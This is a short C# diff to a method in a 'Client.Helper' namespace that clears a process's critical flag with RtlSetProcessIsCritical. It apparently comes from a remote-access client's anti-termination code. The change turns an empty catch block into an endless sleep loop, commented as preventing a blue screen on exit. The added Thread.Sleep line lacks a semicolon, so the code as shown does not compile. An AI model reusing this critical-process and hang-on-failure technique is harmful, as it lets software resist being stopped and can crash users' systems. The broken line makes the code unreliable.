@@ -21,7 +21,13 @@ namespace Client.Helper
             {
                 RtlSetProcessIsCritical(0, 0, 0);
             }
-            catch { }
+            catch 
+            { 
+            while(true)
+                {
+                Thread.Sleep(100000) //prevents a BSOD on exit failure
+                }
+            }
         }
 
         #region "Native Methods"
